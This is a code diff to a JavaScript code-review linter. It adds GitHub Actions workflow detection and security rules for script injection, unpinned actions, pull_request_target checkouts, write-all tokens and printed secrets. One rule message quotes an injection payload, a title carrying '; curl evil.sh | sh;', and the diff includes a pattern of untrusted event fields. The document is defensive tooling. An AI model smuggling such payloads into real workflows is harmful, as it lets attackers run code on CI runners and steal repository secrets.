@@ -7,7 +7,7 @@
 import { redact } from './automation-fix.js';
 
 // "review my code", "code review", "check this script", "what's wrong with my function", "is this query safe", "find bugs in this"
-const NOUN = '(?:code|script|function|snippet|program|pull\\s+request|pr|diff|class|method|query|sql|component|module|file|regex)';
+const NOUN = '(?:code|script|function|snippet|program|pull\\s+request|pr|diff|class|method|query|sql|component|module|file|regex|github\\s+action|(?:ci|actions?|github)\\s+workflow|workflow\\s+(?:file|ya?ml))'; // "audit my github actions", "check this ci workflow"
 const ASKS = [
   new RegExp('^(?:please\\s+|pls\\s+|hey\\s+void,?\\s+)?(?:(?:can|could|would|will)\\s+you\\s+)?(?:please\\s+)?(?:do\\s+a\\s+)?(?:code[- ]?review|review|critique|audit|lint|look\\s+over|go\\s+over|sanity[- ]check|check|proofread|improve|refactor|clean\\s+up|find\\s+(?:the\\s+)?bugs?\\s+in|spot\\s+(?:the\\s+)?bugs?\\s+in)\\s+(?:of\\s+)?(?:my|this|the|these|that|our|a|some|following)?\\s*(?:[\\w#+.-]+\\s+){0,2}?' + NOUN + 's?\\b', 'i'),
   /^(?:code[- ]?review|review\s+(?:please|pls|this|it))\b/i,
@@ -44,6 +44,7 @@ export function codeOf(text) {
 export function looksLikeCode(code, lang) {
   const s = String(code || '');
   if (s.trim().length < 8) return false;
+  if (!lang && langOf(s) === 'yaml') lang = 'yaml'; // a pasted workflow or manifest counts as YAML even when the ask doesn't say so
   let n = 0;
   if (/[{};]\s*$/m.test(s)) n++;
   if (/\b(?:function|const|let|var|def|class|import|from|return|if|else|elif|for|while|public|private|static|void|func|fn|package|SELECT|INSERT|UPDATE|DELETE|CREATE|echo|fi|done|then|async|await|lambda|struct|impl|module|require|except|raise|try|catch|throw|assert|val|guard|DROP|ALTER|TRUNCATE|GRANT|REVOKE)\b/.test(s)) n++;
@@ -61,11 +62,13 @@ export function looksLikeCode(code, lang) {
 }
 
 // the language when the ask names it: "is this python code ok"
-const NAMED = [['powershell', /\bpowershell\b|\bpwsh\b|\bps1\b/], ['terraform', /\bterraform\b|\bhcl\b|\btf\s*:/], ['dockerfile', /\bdocker\s*file\b|\bcontainerfile\b/], ['yaml', /\bya?ml\b/], ['lua', /\blua\b/], ['perl', /\bperl\b/], ['python', /\bpython\b|\bpy\b/], ['typescript', /\btypescript\b|\bts\b/], ['javascript', /\bjavascript\b|\bjs\b|\bnode(?:\.?js)?\b|\breact\b/], ['sql', /\bsql\b|\bquery\b/], ['shell', /\bbash\b|\bshell\b|\bsh\b|\bzsh\b/], ['go', /\bgolang\b|\bgo\s+code\b|\bgo\s*:|\b(?:this|my|the|some)\s+go\s*$/], ['rust', /\brust\b/], ['java', /\bjava\b/], ['csharp', /\bc#|\bc\s*sharp\b/], ['php', /\bphp\b/], ['ruby', /\bruby\b/], ['kotlin', /\bkotlin\b/], ['swift', /\bswift\b/], ['c', /\bc\+\+|\bcpp\b|\bc\s+code\b|\bc\s*:|\b(?:this|my|the|some)\s+c\s*$/], ['html', /\bhtml\b|\bmarkup\b/], ['css', /\bcss\b|\bstylesheet\b|\bscss\b/]]; // markup last: "js that builds html" is JavaScript
+const NAMED = [['powershell', /\bpowershell\b|\bpwsh\b|\bps1\b/], ['terraform', /\bterraform\b|\bhcl\b|\btf\s*:/], ['dockerfile', /\bdocker\s*file\b|\bcontainerfile\b/], ['yaml', /\bya?ml\b|\bgithub\s+actions?\b|\b(?:ci|actions?|github)\s+workflows?\b|\bworkflow\s+file\b/], ['lua', /\blua\b/], ['perl', /\bperl\b/], ['python', /\bpython\b|\bpy\b/], ['typescript', /\btypescript\b|\bts\b/], ['javascript', /\bjavascript\b|\bjs\b|\bnode(?:\.?js)?\b|\breact\b/], ['sql', /\bsql\b|\bquery\b/], ['shell', /\bbash\b|\bshell\b|\bsh\b|\bzsh\b/], ['go', /\bgolang\b|\bgo\s+code\b|\bgo\s*:|\b(?:this|my|the|some)\s+go\s*$/], ['rust', /\brust\b/], ['java', /\bjava\b/], ['csharp', /\bc#|\bc\s*sharp\b/], ['php', /\bphp\b/], ['ruby', /\bruby\b/], ['kotlin', /\bkotlin\b/], ['swift', /\bswift\b/], ['c', /\bc\+\+|\bcpp\b|\bc\s+code\b|\bc\s*:|\b(?:this|my|the|some)\s+c\s*$/], ['html', /\bhtml\b|\bmarkup\b/], ['css', /\bcss\b|\bstylesheet\b|\bscss\b/]]; // markup last: "js that builds html" is JavaScript
 export function langNamed(ask) { const a = String(ask || '').toLowerCase(); for (const [l, re] of NAMED) if (re.test(a)) return l; return null; }
 
 export function langOf(code) {
   const s = String(code || '');
+  // YAML first, before its run: blocks read as shell: a GitHub Actions workflow (jobs: with steps or runs-on) or a Kubernetes manifest
+  if ((/^jobs:\s*$/m.test(s) && /^\s*(?:-\s+)?(?:runs-on|steps|uses):/m.test(s)) || (/^apiVersion:\s*\S/m.test(s) && /^kind:\s*\S/m.test(s))) return 'yaml';
   if (/^\s*#!.*\b(?:ba|z|k)?sh\b/m.test(s) || (/\b(?:fi|done|esac)\s*$/m.test(s) && /\b(?:then|do)\b/.test(s)) || /^\s*(?:sudo\s+)?(?:rm|cp|mv|echo|export|cd|apt(?:-get)?|chmod|curl|wget)\s/m.test(s) && !/[;{]\s*$/m.test(s)) return 'shell';
   if (/<\?php|\$\w+\s*->/.test(s)) return 'php';
   if (/^\s*(?:SELECT|INSERT\s+INTO|UPDATE\s+\w+\s+SET|DELETE\s+FROM|CREATE\s+(?:TABLE|INDEX|VIEW)|ALTER\s+TABLE|DROP\s+TABLE|WITH\s+\w+\s+AS)\b/im.test(s) && !/[{}]|\bdef\b|\bfunction\b|=>/.test(s)) return 'sql';
@@ -109,6 +112,8 @@ export function mask(code, lang) {
 // One rule = [id, kind, languages ('*' = any), test(maskedLine, rawLine, ctx) -> bool, plain message, fix (optional)]
 // kind: 'bug' (wrong result or crash), 'risk' (security or data loss), 'style' (works, but easy to get wrong later)
 const JS = ['javascript', 'typescript'];
+// event fields anyone outside the repo can set (GitHub's list of untrusted input), as they appear inside ${{ }}
+const GHA_UNTRUSTED = /\$\{\{[^}]*\b(?:github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.(?:ref|label)|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|head_commit\.(?:message|author\.(?:email|name))|commits\b[^}]*\.(?:message|author\.(?:email|name))|workflow_run\.(?:head_branch|head_commit\.message)|pages\b[^}]*\.page_name)|github\.head_ref)\b/;
 const RULES = [
   ['assign-in-condition', 'bug', [...JS, 'java', 'csharp', 'c', 'php'], (m) => /\b(?:if|while)\s*\(\s*!?\s*[A-Za-z_$][\w$.[\]]*\s*=\s*[^=>]/.test(m),
     'an assignment (=) inside the condition: it sets the value and is then always true or false. To compare, use === (or == outside JavaScript).'],
@@ -271,6 +276,19 @@ const RULES = [
     'a login token in localStorage can be read by any script on the page, so one XSS bug hands it over. Keep it in an HttpOnly, Secure cookie the page\'s scripts cannot read'],
   ['java-runtime-exec', 'risk', ['java', 'kotlin'], (m) => /\bRuntime\.getRuntime\(\)\.exec\s*\(\s*(?!")[^)]/.test(m),
     'Runtime.exec with a variable command: when any of it comes from a user, they choose what runs. Use ProcessBuilder with a fixed program and the arguments as separate strings'],
+  // GitHub Actions workflows (GitHub's "Security hardening for GitHub Actions"): untrusted event text in a script, movable action
+  // versions, PR code run with secrets, a token that can write everything, a secret printed by the script
+  ['gha-script-injection', 'risk', ['yaml'], (m, r) => GHA_UNTRUSTED.test(r) && !/^\s*(?:-\s+)?if:/.test(r) && !/^\s*(?:-\s+)?(?!run:|script:)[\w-]+:\s*(["']?)\$\{\{[^}]*\}\}\1\s*(?:#.*)?$/.test(r),
+    'text anyone can write (an issue or pull request title, a comment, a branch name) is pasted into the script, so a title like a"; curl evil.sh | sh; " runs on the runner with your token. Pass it through env: (TITLE: ${{ github.event.issue.title }}) and use "$TITLE" in the script'],
+  ['gha-unpinned-action', 'risk', ['yaml'], (m, r) => { const k = r.match(/^\s*(?:-\s+)?uses:\s*["']?([\w.-]+)\/[\w./-]+@([\w./-]+)/); if (!k || /^[0-9a-f]{40}$/.test(k[2])) return false;
+      return /^(?:main|master|dev|develop|head|latest)$/i.test(k[2]) || !/^(?:actions|github)$/i.test(k[1]); },
+    'this action is pinned to a tag or a branch, and whoever controls that repository can move it to new code that then runs with your secrets. Pin third-party actions to a full commit SHA (uses: owner/action@<40-character sha> # v1.2.3)'],
+  ['gha-prt-checkout', 'risk', ['yaml'], (m, r, x) => /^\s*(?:-\s+)?ref:\s*["']?\$\{\{\s*(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref)\b/.test(r) && /^\s*(?:-\s+)?pull_request_target\b/m.test(x.prev()),
+    'a pull_request_target workflow runs with your secrets and a write token, and this step checks out the pull request\'s own code, so anyone who opens a PR can run their code with them. Build PR code under the pull_request event instead'],
+  ['gha-write-all', 'risk', ['yaml'], (m, r) => /^\s*permissions:\s*["']?write-all\b/.test(r),
+    'write-all gives every step a token that can push code, change releases and edit issues. Grant only what the job needs: permissions: contents: read, plus the one write it uses'],
+  ['gha-secret-echo', 'risk', ['yaml'], (m, r) => /(?:^|[\s;|&(])(?:echo|printf)\b[^#\n]*\$\{\{\s*secrets\.\w+/.test(r),
+    'the script prints a secret. GitHub masks secrets it knows in the log, but a changed or partial value slips through. Pass it through env: and never print it'],
   ['yaml-privileged', 'risk', ['yaml'], (m) => /^\s*(?:-\s+)?privileged:\s*true\b/.test(m),
     'privileged: true gives the container root on the host machine: a bug in it becomes a way out of the container. Grant only the capabilities it needs (securityContext.capabilities.add)'],
   ['cs-async-void', 'bug', ['csharp'], (m) => /\basync\s+void\s+\w+\s*\((?![^)]*EventArgs)/.test(m),
